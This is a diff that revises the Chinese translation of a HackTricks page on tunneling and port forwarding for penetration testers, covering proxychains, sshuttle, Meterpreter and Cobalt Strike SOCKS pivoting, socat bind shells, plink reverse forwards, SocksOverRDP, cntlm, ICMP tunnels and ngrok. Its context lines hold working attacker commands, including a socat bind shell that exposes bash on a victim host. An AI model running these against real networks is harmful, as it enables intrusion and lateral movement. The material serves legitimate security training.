@@ -2,20 +2,20 @@
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
-* 你在**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**？或者想要访问**PEASS的最新版本或下载HackTricks的PDF**？查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 探索[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们的独家[NFT收藏品](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。
+* 您在**网络安全公司**工作吗？您想看到您的**公司在HackTricks中做广告**吗？或者您想访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或在**Twitter**上关注我 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
+* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
 
 </details>
 
 ## Nmap提示
 
 {% hint style="warning" %}
-**ICMP**和**SYN**扫描无法通过socks代理进行隧道传输，因此我们必须**禁用ping发现**(`-Pn`)并指定**TCP扫描**(`-sT`)才能使其正常工作。
+**ICMP**和**SYN**扫描无法通过socks代理进行隧道传输，因此我们必须**禁用ping发现**（`-Pn`）并指定**TCP扫描**（`-sT`）才能使其正常工作。
 {% endhint %}
 
 ## **Bash**
@@ -94,7 +94,7 @@ ifconfig tun0 up #Activate the server side network interface
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
-在客户端上设置一个新的路由。
+在客户端上设置新路由
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
@@ -106,7 +106,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 pip install sshuttle
 sshuttle -r user@host 10.10.10.10/24
 ```
-使用私钥进行连接
+使用私钥连接
 ```bash
 sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 # -D : Daemon mode
@@ -122,9 +122,7 @@ portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
 ```
 ### SOCKS
 
-### SOCKS
-
-SOCKS (Socket Secure) is a protocol that routes network packets between a client and a server through a proxy server. It can be used for tunneling and port forwarding, allowing users to bypass firewalls and access restricted networks. SOCKS operates at the transport layer (Layer 5 of the OSI model) and supports various authentication methods for secure communication.
+SOCKS代理是一种网络协议，允许客户端通过防火墙或NAT网关连接到服务器。 SOCKS可以用于隧道和端口转发，为用户提供匿名性和安全性。
 ```bash
 background# meterpreter session
 route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
@@ -149,7 +147,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS代理
 
-在团队服务器中打开一个端口，监听所有可以用来**通过beacon路由流量**的接口。
+在teamserver中打开一个端口，监听所有可以用来**通过beacon路由流量**的接口。
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -169,7 +167,7 @@ rportfwd stop [bind port]
 ### rPort2Port 本地
 
 {% hint style="warning" %}
-在这种情况下，端口在信标主机上打开，而不是在团队服务器上，并且流量被发送到 Cobalt Strike 客户端（而不是团队服务器），然后从那里发送到指定的主机:端口。
+在这种情况下，**端口在信标主机上打开**，而不是在团队服务器上，**流量被发送到钴蓝打击客户端**（而不是团队服务器），然后从那里发送到指定的主机:端口。
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -227,7 +225,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### 绑定shell
+### 绑定 shell
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
@@ -291,7 +289,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 这就像是控制台版本的 PuTTY（选项与 ssh 客户端非常相似）。
 
-由于这个二进制文件将在受害者中执行，并且它是一个 ssh 客户端，我们需要打开我们的 ssh 服务和端口，以便我们可以建立一个反向连接。然后，只需将本地可访问端口转发到我们机器上的一个端口：
+由于这个二进制文件将在受害者中执行，并且它是一个 ssh 客户端，我们需要打开我们的 ssh 服务和端口，以便我们可以建立一个反向连接。然后，只需将本地可访问的端口转发到我们机器上的一个端口：
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -315,7 +313,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 您需要**通过系统获得RDP访问权限**。\
 下载：
 
-1. [SocksOverRDP x64 二进制文件](https://github.com/nccgroup/SocksOverRDP/releases) - 该工具使用Windows远程桌面服务功能中的`Dynamic Virtual Channels` (`DVC`)。DVC负责**在RDP连接上隧道化数据包**。
+1. [SocksOverRDP x64 二进制文件](https://github.com/nccgroup/SocksOverRDP/releases) - 该工具使用Windows远程桌面服务功能中的`Dynamic Virtual Channels` (`DVC`)。DVC负责**在RDP连接上进行数据包隧道传输**。
 2. [Proxifier 便携版二进制文件](https://www.proxifier.com/download/#win-tab)
 
 在您的客户端计算机上加载**`SocksOverRDP-Plugin.dll`**，如下所示：
@@ -323,7 +321,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-现在我们可以使用`mstsc.exe`连接到受害者的RDP，并且应该收到一个提示，表示SocksOverRDP插件已启用，并且将在127.0.0.1:1080上进行监听。
+现在我们可以使用`mstsc.exe`连接到受害者的RDP，并且我们应该收到一个提示，表示SocksOverRDP插件已启用，并且它将在127.0.0.1:1080上监听。
 
 通过RDP连接并在受害者机器上上传并执行`SocksOverRDP-Server.exe`二进制文件：
 ```
@@ -343,8 +341,8 @@ netstat -antb | findstr 1080
 
 ## NTLM代理绕过
 
-先前提到的工具：**Rpivot**\
-**OpenVPN**也可以绕过它，在配置文件中设置以下选项：
+前面提到的工具：**Rpivot**\
+**OpenVPN**也可以绕过它，设置配置文件中的这些选项：
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -352,7 +350,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-它对代理进行身份验证，并在本地绑定一个端口，该端口将被转发到您指定的外部服务。然后，您可以通过此端口使用您选择的工具。\
+它对代理进行身份验证，并在本地绑定一个端口，该端口被转发到您指定的外部服务。然后，您可以通过此端口使用您选择的工具。\
 例如，将端口443转发。
 ```
 Username Alice
@@ -361,12 +359,12 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-现在，如果你在受害者设备上将 **SSH** 服务设置为监听端口443。你可以通过攻击者的端口2222连接到它。\
-你也可以使用一个 **meterpreter** 连接到 localhost:443，而攻击者在端口2222上监听。
+现在，如果你在受害者设备上将 **SSH** 服务设置为监听端口443。你可以通过攻击者端口2222 连接到它。\
+你也可以使用一个 **meterpreter** 连接到本地主机:443，而攻击者在端口2222上监听。
 
 ## YARP
 
-由 Microsoft 创建的反向代理。你可以在这里找到它：[https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+由微软创建的反向代理。你可以在这里找到它: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNS 隧道
 
@@ -411,20 +409,20 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### 更改 proxychains DNS
 
-Proxychains拦截`gethostbyname` libc调用，并通过socks代理隧道传输tcp DNS请求。默认情况下，proxychains使用的DNS服务器是4.2.2.2（硬编码）。要更改它，请编辑文件：_/usr/lib/proxychains3/proxyresolv_ 并更改IP。如果您在Windows环境中，可以设置域控制器的IP。
+Proxychains 拦截 `gethostbyname` libc 调用，并通过 socks 代理隧道传输 tcp DNS 请求。默认情况下，proxychains 使用的 DNS 服务器是 **4.2.2.2**（硬编码）。要更改它，请编辑文件：_/usr/lib/proxychains3/proxyresolv_ 并更改 IP。如果您在 **Windows 环境** 中，可以设置 **域控制器** 的 IP。
 
-## Go中的隧道
+## Go 中的隧道
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## ICMP隧道
+## ICMP 隧道
 
 ### Hans
 
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-在两个系统中都需要root权限来创建tun适配器，并使用ICMP回显请求在它们之间隧道数据。
+在两个系统中都需要 root 权限来创建 tun 适配器，并使用 ICMP 回显请求在它们之间隧道数据。
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -448,7 +446,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ```
 ## ngrok
 
-**[ngrok](https://ngrok.com/)是一个工具，可以通过一个命令将解决方案暴露到互联网。**
+**[ngrok](https://ngrok.com/)是一个工具，可以通过一条命令将解决方案暴露到互联网。**
 *暴露的URI类似于:* **UID.ngrok.io**
 
 ### 安装
@@ -465,7 +463,7 @@ chmod a+x ./ngrok
 
 **文档:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).
 
-*如果需要，还可以添加身份验证和TLS。*
+*如果需要的话，也可以添加身份验证和TLS。*
 
 #### TCP隧道
 ```bash
@@ -482,7 +480,7 @@ chmod a+x ./ngrok
 ```
 #### 拦截HTTP调用
 
-*用于XSS、SSRF、SSTI...*
+*用于XSS、SSRF、SSTI ...*
 直接从stdout或在HTTP接口[http://127.0.0.1:4040](http://127.0.0.1:4000)中。
 ```bash
 ./ngrok http localhost:8080 --host-header=rewrite
@@ -514,12 +512,12 @@ addr: file:///tmp/httpbin/
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>
 
-* 你在**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**？或者想要访问**PEASS的最新版本或下载HackTricks的PDF**？查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
-* 探索[**PEASS Family**](https://opensea.io/collection/the-peass-family)，我们独家的[NFT收藏品](https://opensea.io/collection/the-peass-family)
-* 获取[**官方PEASS & HackTricks周边**](https://peass.creator-spring.com)
-* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter**上**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* 您在**网络安全公司**工作吗？ 想要看到您的**公司在HackTricks中被广告**？ 或者您想要访问**PEASS的最新版本或下载HackTricks的PDF**？ 请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
+* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
+* 获取[**官方PEASS和HackTricks衣服**](https://peass.creator-spring.com)
+* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
 * **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。
 
 </details>
